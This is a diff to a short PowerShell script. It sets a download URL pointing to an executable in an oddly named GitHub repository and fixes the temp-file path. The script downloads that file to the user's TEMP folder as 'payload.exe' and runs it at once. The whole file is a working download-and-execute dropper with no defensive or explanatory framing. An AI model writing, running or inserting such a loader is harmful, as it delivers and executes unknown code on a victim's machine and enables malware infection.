@@ -1,5 +1,5 @@
-$exeUrl = ""
-$tempPath = "$env:TEMP\\payload.exe"
+$exeUrl = "https://github.com/ffufufufu84bu84u84u4bh8ud/jnrooenrofenokrkfk/raw/refs/heads/main/test.exe"
+$tempPath = "$env:TEMP\payload.exe"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
 Start-Process $tempPath
